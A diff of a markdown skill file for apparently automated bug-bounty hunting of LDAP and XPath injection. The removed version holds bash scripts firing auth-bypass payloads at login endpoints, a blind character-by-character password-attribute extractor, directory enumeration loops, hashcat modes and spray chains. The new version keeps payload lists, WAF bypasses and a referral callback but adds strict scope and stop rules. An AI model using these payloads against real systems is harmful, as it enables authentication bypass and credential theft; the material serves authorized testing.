@@ -5,306 +5,92 @@ sources: hackerone_public, owasp, portswigger
 report_count: 0
 ---
 
-# HUNT-LDAP — LDAP Injection & XPath Injection
+# HUNT-LDAP — LDAP injection and XPath injection
 
-> Grounding note: LDAP injection is rarely disclosed with verbatim payloads on
-> public platforms (most live on internal-pentest reports). This skill is
-> grounded in the **OWASP LDAP Injection Prevention / Testing Guide
-> (WSTG-INPV-06)**, **PortSwigger Web Security Academy (LDAP injection)**, and
-> the **RFC 4515** filter grammar — all publicly verifiable references rather
-> than invented HackerOne IDs. Do not cite a report you cannot link.
+String-built LDAP filters (RFC 4515) and string-built XPath queries. Public write-ups rarely include a live bounty id — ground the report in the filter you proved, not a borrowed H1 number. OWASP WSTG-INPV-06 and the PortSwigger LDAP labs match this oracle.
 
-## Crown Jewel Targets
+## Rails
+- In-scope only. Use an account you control for any login test.
+- No password spraying, credential stuffing, or hash cracking. If you recover a `{SSHA}` / `{CRYPT}` value, stop at the hash. Do not run hashcat or john.
+- No full directory dump. One true/false pair, one record, or a 3-character prefix is the proof.
+- Stop at draft. Never auto-submit.
+- Active Directory `unicodePwd` is write-only. Never report "AD password hashes" from LDAP.
 
-LDAP injection that bypasses authentication = **Critical**. Blind attribute
-exfiltration of credentials/secrets = **High**. AD enumeration alone = Medium-High.
+## AD vs other directories
 
-**Highest-value chains:**
-- **LDAP auth bypass** — close the `uid` filter and append an always-true OR so the
-  bind/search returns the admin entry without a valid password.
-- **Blind attribute exfil** — char-by-char extraction of an attribute value via a
-  boolean oracle (login success/failure, result count, or response length).
-- **userPassword hash exfil (non-AD only)** — on OpenLDAP/389-DS the
-  `userPassword` attribute can hold `{SSHA}`/`{CRYPT}` hashes that ARE readable
-  by query. See the AD-vs-generic warning below.
-- **XPath injection auth bypass** — `' or '1'='1` against XML-backed auth.
-
----
-
-## CRITICAL — Active Directory vs generic LDAP
-
-Do **not** conflate the two. They behave very differently:
-
-| | Generic LDAP (OpenLDAP, 389-DS, ApacheDS) | Active Directory |
+| | OpenLDAP, 389-DS, ApacheDS | Active Directory |
 |---|---|---|
-| Password attribute | `userPassword` — may hold `{SSHA}`/`{MD5}`/`{CRYPT}` and **is readable** if ACL allows | `unicodePwd` — **write-only**, never returned by any search |
-| Hash exfil via injection | **Possible** where ACLs leak `userPassword` | **Not possible** — there is no readable hash attribute over LDAP |
-| Useful enum attrs | `uid`, `cn`, `mail`, `userPassword` | `sAMAccountName`, `userPrincipalName`, `mail`, `memberOf`, `description` (often holds plaintext secrets!) |
+| Password attr | `userPassword` may be readable (`{SSHA}`, `{CRYPT}`) | `unicodePwd` is never returned |
+| What a read proves | that attribute's value | `sAMAccountName`, `userPrincipalName`, `mail`, `memberOf`, `description` / `info` |
+| Auth bypass | same filter tricks | same filter tricks, if the app builds the filter by concat |
 
-**Do not tell a reader that blind LDAP injection yields AD password hashes — it
-does not.** `unicodePwd` is write-only. Against AD, the win is enumeration
-(`sAMAccountName`, `memberOf`, `description`/`info` fields that admins misuse to
-store passwords) and auth bypass — not hash dumping. The hash-exfil technique
-applies **only** to non-AD directories exposing `userPassword`.
+`description` sometimes holds a password an admin typed there. That is a finding only when the value is in the response. Do not guess that it does.
 
----
+## Decision tree
 
-## Attack Surface Signals
+1. **Confirm the backend.** Errors: `InvalidSearchFilterException`, `Bad search filter`, `LDAP: error code`, `javax.naming`, `com.sun.jndi.ldap`, `ldap_search`, `System.DirectoryServices`. Surfaces: corporate login, people search, address book, "find a colleague", `/api/directory`, SSO that still binds to LDAP.
+2. **Baseline** a normal username and a wrong password. Save status, length, and a body marker (`Invalid credentials` vs a session cookie).
+3. **Unbalanced vs balanced.** Username `test)` vs `test()`. A syntax error on the unbalanced input and a normal failure on the balanced one means the value is inside a filter. If both look identical, try `*` and `\` and then leave.
+4. **Which context.**
+   - Filter `(attr=VALUE)` → `* ( ) \ NUL & | !`.
+   - DN `uid=VALUE,ou=people,dc=corp` → `, = + " \ < > ;`. A `*` is not a wildcard in a DN. Payloads do not transfer.
+5. **Auth bypass** only if the always-true filter returns a session that loads a post-login page, and the false filter does not.
+6. **Blind read** only if you need a secret attribute to explain impact. Recover a short prefix (the `{SSHA}` tag, or three characters). Stop.
+7. **XPath** when the store is XML (`//user[name='INPUT']`). No SQL comments — balance quotes yourself.
 
-```
-Corporate SSO / intranet login pages (often legacy Java/Spring/PHP)
-Windows + IIS + "integrated" directory auth
-/api/ldap/*  /api/directory/*  /people  /address-book  /search?dir=
-"Find a colleague" / org-chart / employee-search features
-XML-backed config or auth → XPath injection candidate
-Error strings that confirm an LDAP backend:
-  javax.naming.NameNotFoundException
-  javax.naming.directory.InvalidSearchFilterException
-  LDAP: error code 49 - 80090308  (AD invalid creds / bind failure)
-  com.sun.jndi.ldap.*  /  System.DirectoryServices  /  ldap_search():
-  "Bad search filter"  /  net.ldap (Go)  /  python-ldap SERVER_DOWN
-```
+## Payloads
 
----
-
-## LDAP filter grammar (RFC 4515) — why injection works
-
-A login filter is typically built by string-concat:
+Assume a common shape `(&(uid=USER)(userPassword=PASS))`. Count parentheses on the **finished** filter. An extra `)` is a syntax error, not a bypass.
 
 ```
-(&(uid=<USERNAME>)(userPassword=<PASSWORD>))
+*
+admin*
+admin)(&)
+*)(uid=*))(|(uid=*
+*)(objectClass=*
+admin)(!(userPassword=ZZZ))
 ```
+NUL (`%00`) truncates on some C libraries; try once.
 
-`&` = AND, `|` = OR, `!` = NOT. **Filters are prefix/Polish notation** — the
-operator comes first and every sub-filter is parenthesised. To inject you must
-(a) escape the current `(uid=...)` group, (b) inject your own logic, and
-(c) leave the overall parenthesis count **balanced** or the server throws a
-filter-syntax error instead of executing.
+**DN injection** (commas matter): `admin,ou=other,dc=corp` and see if the bind DN changes in an error string.
 
-### The special-character set — TEST EACH ONE
-
-These characters are syntactically meaningful and MUST be escaped by a safe app
-(RFC 4515 §3). If the app reflects an error or behaves differently when you send
-them raw, the input is unescaped → injectable:
-
-| Char | Filter escape | Why it matters |
-|------|---------------|----------------|
-| `*`  | `\2a` | wildcard — matches any value |
-| `(`  | `\28` | opens a filter group |
-| `)`  | `\29` | closes a filter group |
-| `\`  | `\5c` | escape char itself |
-| NUL  | `\00` | string terminator — truncates filter in C-backed servers |
-| `/`  | (DN context) | RDN separator — relevant for DN injection |
-
-**Search-filter context vs DN injection** are different bugs:
-- **Search-filter injection** (most common): your input lands inside a
-  `(attr=VALUE)` filter. Payloads use `* ( ) & | !`.
-- **DN injection**: your input is concatenated into a Distinguished Name
-  (`uid=VALUE,ou=people,dc=corp`). Here `,` `=` `+` `"` `\` `<` `>` `;` and `/`
-  matter, and a `*` is NOT a wildcard. Test both — the payloads do not transfer.
-
----
-
-## Step-by-Step Hunting Methodology
-
-### Phase 1 — Confirm an LDAP backend (baseline first)
-
-```bash
-# ALWAYS capture a control response first — you compare everything to this.
-BASE=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}" \
-  -X POST https://$TARGET/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"validlookinguser","password":"wrongpass"}')
-echo "BASELINE (valid-format, wrong pw): $BASE"
-
-# Send a single unbalanced paren. A SAFE (escaping) app → identical baseline.
-# An INJECTABLE app → 500 / filter-syntax error / different size.
-curl -s -X POST https://$TARGET/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"test)","password":"x"}' | grep -iE \
-  "naming|InvalidSearchFilter|error code 49|Bad search filter|jndi|ldap_search"
+**XPath**
 ```
-
-A lone `)` that produces a syntax error/500 while a balanced payload does not is
-the cleanest LDAP-injection tell — note it, you will need it as proof.
-
-### Phase 2 — Auth-bypass payloads (balance your parentheses)
-
-```bash
-# Target filter assumed: (&(uid=USERNAME)(userPassword=PASSWORD))
-# Goal: make the uid sub-filter always-true and neutralise the password clause.
-
-# Wildcard-everything (works when password clause is dropped by a trailing comment-like break):
-#   username = *)(uid=*))(|(uid=*    password = anything
-# Always-true admin (OR uid=*):
-#   username = admin)(|(uid=*)       (note: leaves one extra ')' — see below)
-# NUL-truncate the password clause (C-backed servers):
-#   username = admin)(uid=*))%00      password = x
-
-USERNAME_PAYLOADS=(
-  'admin))(|(uid=*'        # close uid + close &, open OR uid=* — balance check below
-  '*)(uid=*))(|(uid=*'     # full always-true, self-balancing classic
-  'admin)(!(userPassword=ZZZ))'  # AND NOT a password that is never set → always true
-  'admin*'                 # simple wildcard suffix — try first, lowest noise
-)
-
-for P in "${USERNAME_PAYLOADS[@]}"; do
-  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
-    -H "Content-Type: application/json" \
-    -d "{\"username\":$(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$P"),\"password\":\"anything\"}")
-  echo "PAYLOAD: $P"
-  echo "RESP:    ${R: -40}"
-  echo "BASE:    $BASE   <-- compare http_code+size to rule out false positive"
-  echo "---"
-done
+' or '1'='1
+' or ''='
+admin' or '1'='1' or 'a'='b
+')] | //user[1]/password | //user[('
 ```
+Blind XPath, one character: a predicate `substring(//user[1]/mail,1,1)='a'` whose true and false responses you already distinguished.
 
-**Parenthesis-balancing rule of thumb:** count `(` minus `)` in the *resulting*
-full filter, not just your payload. If the app appends `)(userPassword=...))`
-after your input, leave the right number of trailing `)` so the final string is
-balanced. An unbalanced filter = syntax error = NOT a bypass (false positive).
+**Search oracle (enumeration):** one unlikely prefix `zzqx*` (expect empty) vs one common prefix `a*` (expect hits). If the counts differ, fetch **one** object and stop. Do not loop `a`–`z`.
 
-### Phase 3 — Blind exfil with a CONTROLLED oracle (not raw byte-count)
+**Referral / OOB (rare):** if the server chases a referral you inject, `ldap://UNIQUE.collab/a` is the proof. One attempt.
 
-Raw `size_download` diffing is noise-prone (WAF banners, CSRF tokens, timestamps,
-length-jitter on the injected char itself). Use a **paired true/false control**
-so the oracle is the *response*, not the absolute size.
+## Bypasses
+| Control | Attempt |
+|---|---|
+| Escapes `*` but not `(` | parenthesis payload |
+| Strips `(` once | `))(|(uid=*` |
+| URL-decodes late | `%28` `%29` `%2a` `%00` `%5c` |
+| Blocks `*` in the login field | inject the password field, or a search box instead |
+| WAF on `)(` | encode, or move the payload to JSON `{"username":"..."}` |
 
-```bash
-# Oracle pair: a known-TRUE filter and a known-FALSE filter on a public attr.
-# TRUE : admin)(uid=*))(|(uid=*     -> entry exists
-# FALSE: admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ
-probe () {  # $1 = filter-tail payload -> prints normalized size
-  curl -s -o /dev/null -w "%{size_download}" -X POST https://$TARGET/api/login \
-    -H "Content-Type: application/json" \
-    -d "{\"username\":\"$1\",\"password\":\"x\"}"
-}
-T=$(probe 'admin)(uid=*))(|(uid=*')
-F=$(probe 'admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ')
-echo "TRUE-class size=$T  FALSE-class size=$F"
-[ "$T" = "$F" ] && { echo "No length oracle — try a STATUS or BODY-MARKER oracle, or OOB."; exit; }
+## Validation
+- **Bypass:** session cookie (or equivalent) plus a successful authenticated request. The same request with one parenthesis removed, or with `uid=zzqx_no_such`, must fail. If true and false both log in, the endpoint is broken open — report that, not LDAP injection.
+- **Attribute read:** the value appears in the body, or a 3-character blind prefix reproduces on three repeats while the false control stays false.
+- **Enumeration:** show the empty control and one real record (name, mail, or `memberOf`). Do not attach a user list.
+- **XPath:** a real account context, quotes balanced, not a 500.
+- **Not a finding:** a 500 that appears for every special character including ones you balanced; a size change caused only by the payload being reflected.
 
-# Now extract char-by-char. The boolean test compares against $T/$F, NOT a guess.
-# Filter: (&(uid=admin)(userPassword=<PREFIX><CHAR>*))  on a NON-AD directory.
-PREFIX=""
-for pos in $(seq 1 32); do
-  for C in {a..z} {A..Z} {0..9} '$' '/' '.' '+' '=' '{' '}'; do
-    S=$(probe "admin)(userPassword=${PREFIX}${C}*))(|(uid=*")
-    if [ "$S" = "$T" ]; then PREFIX="${PREFIX}${C}"; echo "[$pos] -> $PREFIX"; break; fi
-  done
-done
-echo "RECOVERED: $PREFIX"
-```
+**Severity:** authenticated as a privileged directory entry (Critical); a secret you actually read from `userPassword` or `description` (High); one-record or `memberOf` disclosure (Medium); a boolean oracle with no sensitive attribute (Medium, and say you stopped). Do not raise it by describing a spray you did not do and must not do.
 
-False-positive guards for blind exfil:
-- **Repeat each positive char 3x** and confirm the size is stable — length-jitter
-  from the attacker-controlled char itself is the #1 false positive.
-- Confirm the **FALSE control still returns the FALSE size** after each round (the
-  app didn't just start erroring on every request — WAF block looks like a match).
-- If body length is unreliable, switch the oracle to **HTTP status**, a **body
-  marker string** (`"Invalid credentials"` present/absent), or **timing** with a
-  heavy filter — but only after establishing a stable baseline delta.
-
-### Phase 4 — XPath injection (XML-backed auth)
-
-```bash
-# Normal: //users/user[name/text()='ADMIN' and password/text()='PASS']
-# Bypass closes the name predicate and OR-trues the whole expression.
-XPATH_PAYLOADS=(
-  "' or '1'='1"
-  "' or ''='"
-  "admin' or '1'='1' or 'a'='b"     # keeps quoting balanced
-  "x'] | //user/* | //user[name()='x"  # blind: dump all user nodes (XPath has no comments)
-  "*[contains(name(),'pass')]"          # node-name discovery
-)
-for P in "${XPATH_PAYLOADS[@]}"; do
-  E=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$P")
-  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
-    --data-urlencode "username=$P" --data-urlencode "password=x")
-  echo "$P  ->  ${R: -24}"
-done
-# XPath has NO comment syntax — you must keep quotes/brackets balanced, unlike SQLi.
-```
-
-### Phase 5 — AD enumeration via wildcard (count oracle, with control)
-
-```bash
-# Establish that prefix='zzqx' (unlikely) returns ~0 and prefix='a' returns more.
-# A directory that returns the SAME count for both is NOT leaking via wildcard.
-count () { curl -s -X POST https://$TARGET/api/directory/search \
-  -H "Content-Type: application/json" -d "{\"filter\":\"(sAMAccountName=$1*)\"}" \
-  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("results",d.get("users",[]))))' 2>/dev/null; }
-CTRL=$(count "zzqx_unlikely")
-echo "control count (should be ~0): $CTRL"
-for L in {a..z}; do echo "$L* -> $(count $L)  (vs control $CTRL)"; done
-# Then pivot to memberOf / description for privileged accounts:
-#   (&(sAMAccountName=*)(memberOf=*Domain Admins*))
-#   (description=*pw*)   (description=*pass*)   — admins stash secrets here
-```
-
-### Phase 6 — Tooling & OOB confirmation
-
-```bash
-# Validate the inferred filter directly if you ever get LDAP creds / a bind:
-ldapsearch -x -H ldap://$AD_HOST -D "CORP\\user" -w "$PW" \
-  -b "dc=corp,dc=local" "(&(objectClass=user)(sAMAccountName=admin*))" sAMAccountName memberOf
-
-# Burp: Intruder over the char set for blind exfil; the Web Security Academy
-# "Blind LDAP injection" labs mirror the Phase-3 oracle exactly.
-# OOB (rare but decisive): some JNDI/LDAP stacks resolve a referral. If you can
-# inject a referral/URL the server dereferences, point it at Collaborator:
-#   (uid=*))(referral=ldap://<COLLAB>/x)   — a DNS/LDAP hit at Collaborator
-# is server-side proof with zero ambiguity. Treat any Collaborator interaction
-# as the gold-standard confirmation for otherwise-blind cases.
-```
-
----
-
-## Chain Table
-
-| LDAP finding | Chain to | Impact |
-|--------------|----------|--------|
-| Auth-bypass (always-true filter) | Admin/SSO panel as first directory entry | Critical |
-| AD enumeration (`sAMAccountName`) | Username list → password spray / credential stuffing | Mass-ATO risk |
-| `memberOf` enumeration | Identify Domain Admins → targeted phishing/spray | Targeted compromise |
-| `description`/`info` field read | Plaintext creds admins stashed there | Direct credential leak |
-| Blind exfil of `userPassword` **(non-AD only)** | `{SSHA}` (salted SHA-1) → hashcat `-m 111` (`{SSHA256}`=1411, `{SSHA512}`=1711); `{CRYPT}` → mode depends on the `$id$` prefix (`$1$`=500, `$6$`=1800) → offline crack | High |
-| LDAP referral → Collaborator | Server-side request / internal directory reach | SSRF-class, confirms blind |
-
-> AD has no readable password attribute — do not list "extract AD hashes" as a
-> chain. Against AD, the credential win comes from `description`/`info` misuse or
-> from enumerated usernames feeding a spray, never from `unicodePwd`.
-
----
-
-## Validation — rule out the false positive BEFORE you report
-
-A "bypass" or "match" is only real once you have eliminated syntax-error,
-WAF-block, and length-jitter explanations.
-
-- [ ] **Auth bypass:** the always-true payload returns a **valid authenticated
-      session** (session cookie + access to a post-login resource), and the same
-      request with one paren removed returns a **filter-syntax error** — proving
-      the filter parsed and executed, not that the app fell open on every input.
-- [ ] **Negative control:** an equivalently-shaped but logically-FALSE payload
-      (`)(uid=NONEXISTENT_ZZZ)`) returns the **failure** response. If both
-      true-class and false-class "succeed", you found a broken endpoint, not LDAP
-      injection.
-- [ ] **Blind exfil:** each recovered char reproduces 3x with stable size; the
-      FALSE control still reads FALSE between rounds; recovered value verified by
-      a direct lookup or by the auth-bypass payload that uses it.
-- [ ] **XPath:** quotes/brackets remained balanced (no 500), and the bypass logged
-      in to a real account context — not just a different error page.
-- [ ] **OOB where possible:** a Collaborator DNS/LDAP interaction from a referral
-      payload is decisive for blind cases — prefer it over length-only inference.
-- [ ] **AD claim discipline:** if you say "AD", you enumerated AD-specific attrs
-      (`sAMAccountName`/`memberOf`); never claim AD hash exfil.
-
-**Severity:**
-- Auth bypass landing as admin/privileged directory entry: **Critical**
-- `userPassword` hash exfil (non-AD) or `description`-field credential read: **High**
-- AD user/group enumeration only: **Medium-High**
-- Blind boolean oracle confirmed but no useful attribute reachable: **Medium**
+## Chains
+- Bypass → one action as that user (`hunt-idor` on a single object).
+- `memberOf` / admin name in the response → note it. Do not spray the name.
+- Non-AD hash in the body → quote the scheme tag. Cracking is out of scope for this harness.
+- Referral callback → `hunt-ssrf` wording, only for the host you hit.
+- XPath `doc()` / `unparsed-text()` that returns a file → `hunt-xxe` / `hunt-lfi` validation (file bytes).
 
 ## Before you report — dedup gate
 
